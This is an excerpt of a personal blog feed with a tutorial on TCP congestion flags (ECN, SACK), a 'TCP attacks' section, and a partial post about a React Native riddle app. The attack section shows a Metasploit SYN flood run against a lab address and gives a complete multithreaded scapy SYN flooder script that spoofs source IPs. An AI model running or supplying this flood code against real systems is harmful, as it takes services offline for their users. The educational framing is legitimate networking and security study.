&lt;h3 id=&quot;the-special-flags&quot;&gt;The special flags.&lt;/h3&gt;

&lt;p&gt;If you remember we talk earlier about three flags that are called Explicit Congestion Notification. In TCP word if the two endpoint sense some congestion in the network which mean some sort of load that cause drop of TCP segments, the endpoint that sense the congestion will send notification to the other endpoint that and and the two endpoint will decrease the traffic by using window scale.
The problem with that operation is that we always need to resend some packets that was lost during the TCP session. To migrate that issue we use the ECN flags.&lt;/p&gt;

&lt;p&gt;So we have three flags as follow:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;NS - That is the ECN-nonce bit&lt;/li&gt;
  &lt;li&gt;CWR - stand for Congestion Window Reduced, if the endpoint got a ECE flag he will response with CWR flag set to tell the other side that he going to use window scale to decrease the traffic&lt;/li&gt;
  &lt;li&gt;ECE - ECE-Echo, this bit used to update the other side that some congestion occur.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Let’s say that one side send 3 packets to the other side.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cap22.png&quot; alt=&quot;cap22&quot; title=&quot;cap22&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 35&lt;/strong&gt; TCP ending session.&lt;/p&gt;

&lt;p&gt;if some congestion was occur the router in the middle discard the packets.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cap23.png&quot; alt=&quot;cap23&quot; title=&quot;cap23&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 36&lt;/strong&gt; TCP ending session.&lt;/p&gt;

&lt;p&gt;So the receiver response with ACK that approved only the first arrived TCP segment in our case, and in the SACK filed he specifies the segments that arrived after the first one, in our case it’s segment 3 so the sender knows that the segment 2 is missing and lost during the transport, so the sender will send the segments again.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cap24.png&quot; alt=&quot;cap24&quot; title=&quot;cap24&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 37&lt;/strong&gt; The receiver approved for segment 1 and 3.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cap25.png&quot; alt=&quot;cap25&quot; title=&quot;cap25&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 38&lt;/strong&gt; The receiver resend segment 2.&lt;/p&gt;

&lt;p&gt;However if the router in the middle support in ECN he will set the ECN flags in the IP packets, this flags is part of DSCP (DiffServ) that used for Quality Of Service. You may ask why the flags set in the IP packet and not in the TCP segment, so please remember that the router working at most at layer 3 and doesn’t open the packets to see the TCP segment, so the flags set must be done in layer 3, so we have two bits that are called ECN-Capable Transport as follow:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cap26.png&quot; alt=&quot;cap26&quot; title=&quot;cap26&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 39&lt;/strong&gt; IP packets headers.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Not-ECT - If the two bits are 0’s this mean that there is no support in ECN.&lt;/li&gt;
  &lt;li&gt;ECT - If the one of the bits are 1 this mean that there is support in ECN.&lt;/li&gt;
  &lt;li&gt;CE - If both bits set to 1 it’s mean that congestion occur.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cap27.png&quot; alt=&quot;cap27&quot; title=&quot;cap27&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
 &lt;strong&gt;Figure 40&lt;/strong&gt; ECN bits.&lt;/p&gt;

&lt;p&gt;To summaries all thing together let’s look what really happens when congestion occur:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;The sender send some packets to the other endpoint with ECN Capable set in IP packets .&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cap28.png&quot; alt=&quot;cap28&quot; title=&quot;cap28&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 41&lt;/strong&gt; ECN capable.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;An ECN-capable router detects impending congestion, is usual case the router will start to drop packets, but in our case the router that an ECT codepoint is set in the packet so instead of dropping the packet, the router chooses to set the CE codepoint in the IP header and forwards the packet.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cap29.png&quot; alt=&quot;cap29&quot; title=&quot;cap29&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 42&lt;/strong&gt; The router inform about the congestion.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The receiver receives the packet with the CE codepoint set, and sets the ECN-Echo flag in its next TCP ACK sent to the sender.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cap30.png&quot; alt=&quot;cap30&quot; title=&quot;cap30&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 43&lt;/strong&gt; ECN-Echo flag is set.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The sender receives the TCP ACK with ECN-Echo set, and reacts to the congestion as if a packet had been dropped. that mean he will decrease the window size during the session.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cap31.png&quot; alt=&quot;cap31&quot; title=&quot;cap31&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 44&lt;/strong&gt; The sender going to decrease the  window size.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;So the sender sets the CWR flag in the TCP header of the next packet sent to the receiver to acknowledge its receipt of and reaction to the ECN-Echo flag.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In some special cases the the ECN flags in the IP packets can be override by unmarked or mark some value in the DiffServ through the way of packet traveling, so in that case the using of ECN-nonce is coming in, it enables the receiver to demonstrate to the sender that segments being acknowledged were received unmarked. The sender then can verify the nonce sum returned by the receiver to ensure that congestion indications in the form of marked (or dropped) packets are not being concealed&lt;/p&gt;

&lt;p&gt;So this leave us with 3 bits reserved and 9 bits used for flags in TCP segment.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cap32.png&quot; alt=&quot;cap32&quot; title=&quot;cap32&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 45&lt;/strong&gt; Reserved and flags.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;summary&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;The ECN bits used with some related bit from IP packets and their goal is to notify about congestion that occur in the network and decrement the window size value.&lt;/p&gt;

&lt;h3 id=&quot;tcp-attacks&quot;&gt;TCP attacks.&lt;/h3&gt;

&lt;p&gt;OK guys, if you read so far, you have pritty good knowledge about the TCP session. Now it’s time to start to game with the coolest stuff, there are some attacks that look like deny of service and some of them are focus of disrupting some exist TCP session.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;TCP SYN/ACK Flood Attack&lt;/strong&gt; - in this attack we will flood our victim with SYN/ACK requesting for initiate a session but we never done the three way handshake which mean that the victim holds these session open and awaiting the final packet in the sequence so it fill up the available connections and denies any requesting clients access.&lt;/p&gt;

&lt;p&gt;To perform this attack I’m going to use msfconsole in my Linux Kali distribution, on the terminal type &lt;code class=&quot;highlighter-rouge&quot;&gt;msfconsole&lt;/code&gt; and Metasploit Framework will open. After the msfconsole will open type &lt;code class=&quot;highlighter-rouge&quot;&gt;use auxiliary/dos/tcp/synflood&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/kali1.png&quot; alt=&quot;kali1&quot; title=&quot;kali1&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 46&lt;/strong&gt; Metasploit Framework.&lt;/p&gt;

&lt;p&gt;To see the options we have just type &lt;code class=&quot;highlighter-rouge&quot;&gt;show options&lt;/code&gt;, we will setup the RHOST which is the ip address of our victim and we use port 80 as default.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/kali2.png&quot; alt=&quot;kali2&quot; title=&quot;kali2&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 47&lt;/strong&gt; rhost.&lt;/p&gt;

&lt;p&gt;The attack will going to be on 10.0.0.138 port 80 which is the http service. To initiate the attack we only need to type &lt;code class=&quot;highlighter-rouge&quot;&gt;exploit&lt;/code&gt; and hit enter.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/kali3.png&quot; alt=&quot;kali3&quot; title=&quot;kali3&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 48&lt;/strong&gt; exploit.&lt;/p&gt;

&lt;p&gt;now if I trying to get to my router at http service I will not be able to connect and I will get an error after long time.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/connecting_error.png&quot; alt=&quot;connecting_error&quot; title=&quot;connecting_error&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 49&lt;/strong&gt; HTTP connecting error.&lt;/p&gt;

&lt;p&gt;tcp.flags.ack == 1&lt;/p&gt;

&lt;p&gt;I opened Wireshark and I saw many TCP segment that contain only SYN flag in active form.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/wireshark_sniffing_with_SYN.png&quot; alt=&quot;wireshark_sniffing_with_SYN&quot; title=&quot;SYN flag&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 50&lt;/strong&gt; Wireshark sniffing with SYN.&lt;/p&gt;

&lt;p&gt;I done the same attack but now I setup my source IP, if you doesnt set the source IP it will be randomize, My filter is &lt;code class=&quot;highlighter-rouge&quot;&gt;tcp.flags.ack == 1 || tcp.flags.syn == 1&lt;/code&gt; and we can see the SYN and ACK session between my DG and my Kali host.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/kali4.png&quot; alt=&quot;kali4&quot; title=&quot;kali4&quot; class=&quot;img-responsive&quot; height=&quot;1000px&quot; width=&quot;2000px&quot; /&gt;
&lt;strong&gt;Figure 51&lt;/strong&gt; More sniffing.&lt;/p&gt;

&lt;p&gt;To kill the attack just type ctrl+c, in my case after I killed the attack I was able to connect my DG.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/env python&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#########################################&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# SYNflood - A multithreaded SYN Flooder&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# author: arthurnn&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#########################################&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;threading&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;scapy.all&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Usage: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s &amp;lt;Target IP&amp;gt; &amp;lt;Port&amp;gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;total&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;conf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iface&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'en1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#network card XD&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;sendSYN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;threading&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;threading&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__init__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;src&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;i.&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;i.&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;i.&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;i&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;randint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;254&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;randint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;254&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;randint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;254&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;randint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;254&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dst&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;

		&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sport&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;randint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;65535&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dport&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'S'&lt;/span&gt;

		&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;verbose&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Flooding &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s:&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;i with SYN packets.&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;sendSYN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;total&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Total packets sent:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\t\t\t&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;i&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;total&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;


  &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;https://twitter.com/GuyZwerdling/status/938687023917010944&lt;/p&gt;</content><author><name>Guy Zwerdling</name></author><category term="network" /><summary type="html">The TCP is freaking amazing! it helps you to track down the packets over the net and knowing for surely that they arrived to the other endpoint successfully. also if the packets arrived to the other endpoint not in the same order they was sent in the first place, the other side will now what is the right sequence of the packets and arrange theme correctly. Let's dive in to the TCP world!</summary></entry><entry><title type="html">Nach Riddles!</title><link href="http://localhost:4000/2017/10/23/Abiha-hidot.html" rel="alternate" type="text/html" title="Nach Riddles!" /><published>2017-10-23T00:00:00+03:00</published><updated>2017-10-23T00:00:00+03:00</updated><id>http://localhost:4000/2017/10/23/Abiha-hidot</id><content type="html" xml:base="http://localhost:4000/2017/10/23/Abiha-hidot.html">&lt;p&gt;Ok, so I finished the application, now it’s on Google Play, the name of the app is “Habia Histom Meni Kedem” of “Nach Riddle”. For me it was realy interesting, and now I have knowledge in React Native, may be when I step foreword I will develop more applications in React-Native, but maybe not. For sure I know that I will be developer in script languages such Python and JavaScripts because of Cyber stream area, I know that I need that knowledge, I have some book in reverse engineer using Python.&lt;/p&gt;

&lt;p&gt;So, my app is very good I think, I got good and bad feedback about that, the game is really hard so I’m sure that some people will leave that game because of the difficulty.&lt;/p&gt;

&lt;p&gt;I think to change some stuff in the app, maybe it will be good:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Give the user the possibility to learn the material which the riddle are based on.&lt;/li&gt;
  &lt;li&gt;Move the reset button to the opening screen.&lt;/li&gt;
  &lt;li&gt;changing the app to work with Flex.&lt;/li&gt;
  &lt;li&gt;add some price to the end of the game.&lt;/li&gt;
  &lt;li&gt;add some music.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I haven’t used Readex yet but I will, some of the code is presented here:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;render() {
  let width = Dimensions.get('window').width;
  let font = width / 10;
  console.log(font)
  return (
    &amp;lt;ScrollView&amp;gt;
    &amp;lt;View style={styles.container}&amp;gt;
      &amp;lt;Image
        style={styles.imageStyle}
        source={require('../img/opening-img2.jpg')}
      &amp;gt;
        &amp;lt;View style={styles.backdropView}&amp;gt;
          &amp;lt;Text style=&amp;gt;אביעה חידות מני קדם&amp;lt;/Text&amp;gt;
          &amp;lt;Image
            style=
            source={require('../img/Book.png')}
          /&amp;gt;
            &amp;lt;Text style={styles.lineText}&amp;gt;1188 חידות על הנביא&amp;lt;/Text&amp;gt;
            &amp;lt;View style={styles.buttonView}&amp;gt;
              &amp;lt;TouchableOpacity
                onPress={() =&amp;gt; this.props.navigation.navigate('Riddles', { home: this.onChangeCount.bind(this)})}
              &amp;gt;
                &amp;lt;View style={styles.button}&amp;gt;
                  &amp;lt;Text style={styles.buttonText}&amp;gt;{this.checkBeginning()}&amp;lt;/Text&amp;gt;
                &amp;lt;/View&amp;gt;
              &amp;lt;/TouchableOpacity&amp;gt;
            &amp;lt;/View&amp;gt;
            &amp;lt;View style={styles.buttonView}&amp;gt;
              &amp;lt;TouchableOpacity
                onPress={() =&amp;gt; this.props.navigation.navigate('Introduction')}
              &amp;gt;
                &amp;lt;View style={styles.button}&amp;gt;
                  &amp;lt;Text style={styles.buttonText}&amp;gt;הוראות&amp;lt;/Text&amp;gt;
                &amp;lt;/View&amp;gt;
              &amp;lt;/TouchableOpacity&amp;gt;
            &amp;lt;/View&amp;gt;
            &amp;lt;View style={styles.buttonView}&amp;gt;
              &amp;lt;TouchableOpacity
